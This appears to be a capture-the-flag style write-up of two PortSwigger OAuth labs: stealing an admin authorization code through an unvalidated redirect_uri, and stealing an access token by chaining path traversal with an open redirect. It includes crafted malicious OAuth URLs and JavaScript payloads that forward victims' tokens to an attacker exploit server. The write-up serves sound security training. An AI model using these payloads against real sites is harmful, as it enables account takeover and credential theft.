**Lab 1: OAuth account hijacking via redirect_uri**

Aim - To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete the user carlos

Use the following credentials: wiener:peter

**1. Initial Exploration**

Proxy Traffic Through Burp: Ensure Burp Suite is running and intercepting traffic.

OAuth Login Process:

Click "My Account" and complete the OAuth login process.

Observe that after logging in, you are redirected back to the blog website.

Session Persistence:

Log out and log back in without entering credentials.

This indicates the presence of an active OAuth session, allowing automatic login.

**2. Analyzing the OAuth Flow**

Study Proxy History: Locate the most recent authorization request in Burp.

Look for a request starting with:

GET /auth?client_id=[...]

![Screenshot from 2025-01-05 19-36-03](https://github.com/user-attachments/assets/c434ac3d-490f-478c-9f51-035df8cc596f)

Redirect Observation:

Notice that when this request is sent, the response includes a redirection to the redirect_uri with an authorization code in the query string.

Send this request to Burp Repeater.

**3. Testing Redirect URI Vulnerability**

Send Arbitrary Values:

In Burp Repeater, modify the redirect_uri parameter to an arbitrary value.

Observe that the server accepts this input and generates a redirect without error.

Leak Authorization Code:

Change the redirect_uri to point to your exploit server, such as:

![Screenshot from 2025-01-05 19-35-34](https://github.com/user-attachments/assets/2a7d1953-69b3-44e9-aeb1-3c2bb7f7446e)

https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net

Send the request and follow the redirect.

Check the exploit server's access log to confirm a log entry with the authorization code.

**4. Creating the Exploit**

Iframe Creation: On the exploit server, create an iframe with the following code:

![Uploading Screenshot from 2025-01-05 19-35-34.pngâ€¦]()
  
Store and View Exploit:

Save the exploit and click "View Exploit".

Confirm that the iframe loads correctly.

![Screenshot from 2025-01-05 19-35-25](https://github.com/user-attachments/assets/546da374-ca92-4e21-8b00-13b9e2e4471a)

**5. Stealing the Authorization Code**

Deliver Exploit to Victim:

Send the exploit to the victim and wait for them to load it.

Access Log Verification:

Check the exploit server's access log for a new entry containing the victim's authorization code.

**6. Using the Stolen Code**

Log Out: Log out of the blog website.

Use Stolen Code:

Replace STOLEN-CODE with the code obtained from the victim and navigate to:

![Screenshot from 2025-01-05 19-35-12](https://github.com/user-attachments/assets/243b9788-edcc-437c-a90e-f879d1738dbf)

https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE

The OAuth flow will complete automatically, and you will be logged in as the admin user.

**7. Solving the Lab**

Access Admin Panel:

Navigate to the admin panel as the admin user.

Delete the user carlos to solve the lab.

**Key Notes**

Redirect URI Misconfiguration: The vulnerability arises because the server fails to validate the redirect_uri parameter.

Exploit Server Usage: Always check the access logs to confirm successful exploitation.

Controlled Environment: Perform this lab only in authorized environments, such as PortSwigger labs.

**Lab 2: Stealing OAuth access tokens via an open redirect**

**AIM** - To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner

Use the following credentials: wiener:peter

**1. Analyze OAuth Workflow**

While proxying traffic through Burp, click on "My account" and complete the OAuth login process.

Observe the flow of requests in Burp's Proxy tab.

Notably, the blog site makes an API call to the /me endpoint to retrieve user details using the access token.

Send the GET /me request to Burp Repeater for later use.

**2. Test the Redirect URI for Vulnerabilities**

Log out and log back in, capturing the GET /auth?client_id=[...] request from the proxy history.

Send this request to Burp Repeater.

Test modifying the redirect_uri parameter. While the server blocks unauthorized domains, it allows additional path segments or traversal sequences like /../ to bypass validation.

**3. Confirm Directory Traversal Vulnerability**

Log out and enable Burp interception.

Log in again and intercept the GET /auth?client_id=[...] request.

Modify the redirect_uri parameter to:

https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1

Forward the request and observe that you're redirected to the blog's first post, with the access token included in the URL fragment.

**4. Discover Open Redirect Vulnerability**

Audit the "Next post" functionality on the blog, which redirects users based on a query parameter.

Send the GET /post/next?path=[...] request to Burp Repeater.

Modify the path parameter to an absolute URL, such as:

https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net

Observe that the site redirects to the external domain, confirming the open redirect vulnerability.

**5. Craft the Malicious OAuth URL**

Combine the directory traversal and open redirect vulnerabilities to create a URL that:

Initiates the OAuth login flow.

Redirects to the open redirect endpoint, which forwards the victim to your exploit server.

The URL should look like this:
https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email

Test this URL by visiting it in your browser. Ensure you are redirected to your exploit server, and the access token is included in the URL fragment.

**6. Create an Exploit Script**

On your exploit server, create a script at /exploit to extract the access token. For example:

"<script>
    window.location = '/?' + document.location.hash.substr(1);
</script>"

![Screenshot from 2025-01-06 10-27-28](https://github.com/user-attachments/assets/031ce9c5-b0a0-4aea-a53f-5e53f931c1da)

Store this script and test it by visiting the malicious URL.
![Screenshot from 2025-01-06 10-27-47](https://github.com/user-attachments/assets/2ef76824-238b-4338-9288-5e63152628e6)

Check the server's access logs for a request like:

GET /?access_token=ACCESS_TOKEN

**7. Final Exploit Script**

Create a script that forces the victim to visit the malicious OAuth URL and then redirects their access token to your server:

"<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email';
    } else {
        window.location = '/?' + document.location.hash.substr(1);
    }
</script>"

Store this script as the exploit and test it by clicking "View exploit."
![Screenshot from 2025-01-06 10-20-09](https://github.com/user-attachments/assets/dcbefcf9-aead-45f9-be4f-f624afd213bd)

Check the exploit server's access logs for the stolen access token.
![Screenshot from 2025-01-06 10-27-21](https://github.com/user-attachments/assets/38031e40-e837-4bcd-84db-ebc2e37546b5)

**8. Use the Stolen Token**

Copy the access token from the logs.

In Burp Repeater, go to the GET /me request and replace the Authorization: Bearer token with the stolen token.

Send the request and confirm you can access the victim's data, including their API key.

**9. Submit the Solution**

Use the victim's API key to submit the solution and complete the lab.
